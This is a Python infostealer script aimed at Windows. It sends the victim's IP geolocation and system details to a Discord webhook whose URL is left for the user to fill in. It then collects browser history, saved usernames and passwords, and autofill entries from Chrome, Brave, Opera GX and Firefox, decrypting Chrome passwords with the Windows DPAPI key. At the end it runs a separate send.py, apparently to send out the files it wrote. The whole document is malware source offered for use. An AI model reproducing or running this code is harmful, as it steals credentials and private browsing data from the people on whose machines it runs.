import requests
from dhooks import Webhook
import platform
import os
import getpass
import psutil
import sqlite3
import shutil
import datetime
import base64
from Cryptodome.Cipher import AES
import json
import getpass
import tempfile
import win32crypt
import time

hook = Webhook("ENTER UR DISCORD WEBHOOK")

def get_ip():

    site_1 = "https://api.ipify.org/?format=json"
    ip_address = None

    try:

        response = requests.get(site_1)

        if response.status_code == 200:

            ip = response.json()
            ip_address = ip['ip']

        else:

            return

    except requests.RequestException as e:

        return

    if ip_address:

        site_2 = f"https://ipinfo.io/{ip_address}/json"

        try:
            response = requests.get(site_2)

            if response.status_code == 200:

                data_ip = response.json()
                city_ip = data_ip.get('city', 'N/A')
                region_ip = data_ip.get('region', 'N/A')
                country_ip = data_ip.get('country', 'N/A')
                location_ip = data_ip.get('loc', 'N/A')
                organisation_ip = data_ip.get('org', 'N/A')
                timezone_ip = data_ip.get('timezone', 'N/A')

                hook.send(f"""


╔═══════════════════════════════════════════════════╗
               🌍 IP ADDRESS INFORMATION 🌍
╚═══════════════════════════════════════════════════╝

  🌐 IP Address        : {ip_address}

  🏙️ City              : {city_ip}

  🏞️ Region            : {region_ip}

  🌎 Country           : {country_ip}

  📍 Location          : {location_ip}

  🖥️ ISP + ASN         : {organisation_ip}

  ⏰ Timezone          : {timezone_ip}

╚═══════════════════════════════════════════════════╝

                """)

        except requests.RequestException as e:

            pass

get_ip()


def get_computer_info():

    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    architecture = platform.architecture()
    machine = platform.machine()
    processor = platform.processor()


    user_name = getpass.getuser()


    cpu_count = psutil.cpu_count(logical=False)
    cpu_count_logical = psutil.cpu_count(logical=True)
    virtual_memory = psutil.virtual_memory()
    total_memory = virtual_memory.total
    available_memory = virtual_memory.available

    disk_usage = psutil.disk_usage('C:/')
    total_disk = disk_usage.total
    used_disk = disk_usage.used
    free_disk = disk_usage.free



    hook.send(f"""

╔═══════════════════════════════════════════════════╗
              🌟 COMPUTER INFORMATION 🌟
╚═══════════════════════════════════════════════════╝

  🌐 Operating System   : {os_name} {os_version}

  🏷️ Version            : {os_release}

  🖥️ Architecture        : {architecture}

  🧑‍💻 Machine           : {machine}

  ⚙️ Processor           : {processor}

  👤 User Name          : {user_name}

  💻 CPU Cores          : {cpu_count} Physical / {cpu_count_logical} Logical

  💾 Total RAM          : {total_memory / (1024 ** 3):.2f} GB

  🌟 Available RAM      : {available_memory / (1024 ** 3):.2f} GB

  💿 Total Disk Space   : {total_disk / (1024 ** 3):.2f} GB

  📉 Used Disk Space    : {used_disk / (1024 ** 3):.2f} GB

  📂 Free Disk Space    : {free_disk / (1024 ** 3):.2f} GB

╚═══════════════════════════════════════════════════╝

    """)

get_computer_info()

def is_browser_installed(browser_name):
    if browser_name == "chrome":
        browser_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome')
    elif browser_name == "brave":
        browser_path = os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser')
    elif browser_name == "firefox":
        browser_path = os.path.expanduser(r'~\AppData\Local\Mozilla\Firefox')
    elif browser_name == "opera":
        browser_path = os.path.expanduser(r'~\AppData\Local\Opera Software\Opera GX')
    else:
        return False
    return os.path.exists(browser_path)


def get_browser_data():
    browsers = ['chrome', 'brave', 'firefox', 'opera']

    for browser in browsers:
        if not is_browser_installed(browser):
            pass
            continue
        if browser == 'chrome' or browser == 'brave' or browser == 'opera':
            get_chrome_data(browser)
        elif browser == 'firefox':
            get_firefox_data()


def get_chrome_data(browser):

    if browser == "chrome":
        user_data_path = r'~\AppData\Local\Google\Chrome\User Data\Default'
    elif browser == "brave":
        user_data_path = r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default'
    elif browser == "opera":
        user_data_path = r'~\AppData\Local\Opera Software\Opera GX\User Data\Default'


    get_history(user_data_path, browser)
    get_login_data(user_data_path, browser)
    get_web_data(user_data_path, browser)

def get_history(user_data_path, browser):
    chrome_history_path = os.path.expanduser(os.path.join(user_data_path, 'History'))
    temp_history_path = 'browser_history_copy.db'
    shutil.copy2(chrome_history_path, temp_history_path)

    conn = sqlite3.connect(temp_history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, last_visit_time FROM urls")

    with open(f'{browser}_history.txt', 'w', encoding='utf-8') as f:
        f.write("URL, Last Visited\n")
        for row in cursor.fetchall():
            url = row[0]
            last_visit_time = row[1]
            last_visit_time = convert_timestamp(last_visit_time)
            f.write(f"{url}, {last_visit_time}\n")

    conn.close()
    os.remove(temp_history_path)

def convert_timestamp(timestamp):
    timestamp = timestamp / 1000000
    return datetime.datetime.utcfromtimestamp(timestamp).strftime('%H:%M:%S')

def get_login_data(user_data_path, browser):
    chrome_login_path = os.path.expanduser(os.path.join(user_data_path, 'Login Data'))
    temp_path = os.path.join(tempfile.mkdtemp(), "Login Data")
    shutil.copy2(chrome_login_path, temp_path)

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    login_data = []

    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]

        password = decrypt_password(encrypted_password)
        login_data.append({"origin_url": origin_url, "username": username, "password": password})

    conn.close()
    os.remove(temp_path)

    with open(f'{browser}_login.txt', 'w', encoding='utf-8') as f:
        for entry in login_data:
            f.write(f"URL: {entry['origin_url']}\n")
            f.write(f"Username: {entry['username']}\n")
            f.write(f"Password: {entry['password']}\n\n")

def decrypt_password(encrypted_password):
    try:
        local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]

        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_password[3:15])
        decrypted_password = cipher.decrypt_and_verify(encrypted_password[15:-16], encrypted_password[-16:])

        return decrypted_password.decode()
    except Exception as e:

       pass

def get_web_data(user_data_path, browser):
    chrome_web_data_path = os.path.expanduser(os.path.join(user_data_path, 'Web Data'))
    temp_web_data_path = os.path.join(tempfile.mkdtemp(), "Web Data")
    shutil.copy2(chrome_web_data_path, temp_web_data_path)

    conn = sqlite3.connect(temp_web_data_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value FROM autofill")

    with open(f'{browser}_autofill_data.txt', 'w', encoding='utf-8') as f:
        f.write("Name, Value\n")
        for row in cursor.fetchall():
            name = row[0]
            value = row[1]
            f.write(f"{name}, {value}\n")

    conn.close()
    os.remove(temp_web_data_path)

def get_firefox_data():
    firefox_profile_path = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
    for profile in os.listdir(firefox_profile_path):
        profile_dir = os.path.join(firefox_profile_path, profile)
        if os.path.isdir(profile_dir):
            history_path = os.path.join(profile_dir, 'places.sqlite')
            login_data_path = os.path.join(profile_dir, 'logins.json')

            if os.path.exists(history_path):
                get_firefox_history(history_path)
            if os.path.exists(login_data_path):
                get_firefox_login_data(login_data_path)

def get_firefox_history(history_path):
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, last_visit_date FROM moz_places")

    with open('firefox_history.txt', 'w', encoding='utf-8') as f:
        f.write("URL, Last Visited\n")
        for row in cursor.fetchall():
            url = row[0]
            last_visit_time = row[1] / 1000000
            f.write(f"{url}, {datetime.datetime.utcfromtimestamp(last_visit_time).strftime('%H:%M:%S')}\n")

    conn.close()

def get_firefox_login_data(login_data_path):
    with open(login_data_path, 'r', encoding='utf-8') as file:
        logins = json.load(file)

    with open('firefox_login.txt', 'w', encoding='utf-8') as f:
        for entry in logins['logins']:
            f.write(f"URL: {entry['hostname']}\n")
            f.write(f"Username: {entry['username']}\n")
            f.write(f"Password: {entry['password']}\n\n")


get_browser_data()


time.sleep(2)

with open('send.py', 'r') as file:
    exec(file.read())








